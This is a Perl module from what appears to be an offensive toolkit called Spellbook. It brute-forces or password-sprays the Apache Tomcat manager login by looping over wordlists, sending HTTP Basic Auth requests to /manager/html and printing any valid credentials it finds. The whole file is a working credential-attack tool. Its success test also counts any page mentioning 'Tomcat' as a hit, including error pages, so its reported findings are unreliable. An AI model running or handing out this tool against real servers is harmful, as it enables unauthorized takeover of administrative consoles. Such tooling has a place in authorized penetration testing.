package Spellbook::Bruteforce::Tomcat {
    use strict;
    use warnings;
    use Getopt::Long;
    use HTTP::Request::Common;
    use MIME::Base64 qw(encode_base64);
    use Spellbook::Core::UserAgent;
    use Spellbook::Helper::Read_File;

    our $VERSION = '0.0.1';

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, $username, $wordlist, $userlist, $password, $mode, $path, @result);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            'h|help'       => \$help,
            't|target=s'   => \$target,
            'u|username=s' => \$username,
            'w|wordlist=s' => \$wordlist,
            'U|userlist=s' => \$userlist,
            'p|password=s' => \$password,
            'm|mode=s'     => \$mode,
            'P|path=s'     => \$path
        );

        if ($help) {
            return "
                \rBruteforce::Tomcat
                \r=========================
                \r-h, --help         See this menu
                \r-t, --target       Define the target
                \r-u, --username     Define a single username for brute force
                \r-w, --wordlist     Define a password wordlist for brute force
                \r-U, --userlist     Define a username list for password spray
                \r-p, --password     Define a single password for password spray
                \r-m, --mode         Define bruteforce or spray
                \r-P, --path         Define the Tomcat manager path\n\n";
        }

        if (!$target) {
            return @result;
        }

        if ($target !~ /^http(s)?:\/\//) {
            $target = 'https://' . $target;
        }

        if (!$path) {
            $path = '/manager/html';
        }

        if (!$mode) {
            if ($username && $wordlist) {
                $mode = 'bruteforce';
            }
        }

        if (!$mode) {
            if ($userlist && $password) {
                $mode = 'spray';
            }
        }

        if (!$mode) {
            return @result;
        }

        my $manager_url = $target;

        if ($manager_url !~ /\/$/) {
            $manager_url = $manager_url . '/';
        }

        if ($path =~ /^\//) {
            $path =~ s/^\/+//;
        }

        $manager_url = $manager_url . $path;

        my $userAgent = Spellbook::Core::UserAgent -> new();

        if ($mode eq 'bruteforce') {
            if (!$username) {
                return @result;
            }

            if (!$wordlist) {
                return @result;
            }

            my @passwords = Spellbook::Helper::Read_File -> new(['--file' => $wordlist]);

            foreach my $candidate_password (@passwords) {
                chomp($candidate_password);

                my $credentials = $username . ':' . $candidate_password;
                my $encoded_credentials = encode_base64($credentials, '');
                my $response = $userAgent -> request(GET $manager_url, Authorization => "Basic $encoded_credentials");
                my $is_success = is_successful_response($response);

                if ($is_success) {
                    push @result, $username . ':' . $candidate_password;
                    print "Valid credentials found: $username:$candidate_password\n";
                }
            }
        }

        if ($mode eq 'spray') {
            if (!$userlist) {
                return @result;
            }

            if (!$password) {
                return @result;
            }

            my @usernames = Spellbook::Helper::Read_File -> new(['--file' => $userlist]);

            foreach my $candidate_username (@usernames) {
                chomp($candidate_username);

                my $credentials = $candidate_username . ':' . $password;
                my $encoded_credentials = encode_base64($credentials, '');
                my $response = $userAgent -> request(GET $manager_url, Authorization => "Basic $encoded_credentials");
                my $is_success = is_successful_response($response);

                if ($is_success) {
                    push @result, $candidate_username . ':' . $password;
                    print "Valid credentials found: $candidate_username:$password\n";
                }
            }
        }

        return @result;
    }

    sub is_successful_response {
        my ($response) = @_;
        my $is_success = 0;
        my $status_code = $response -> code;

        if ($status_code == 200) {
            $is_success = 1;
        }

        my $content = $response -> decoded_content;

        if ($content) {
            if ($content =~ /Tomcat|Web Application Manager|Manager App/i) {
                $is_success = 1;
            }
        }

        return $is_success;
    }
}

1;
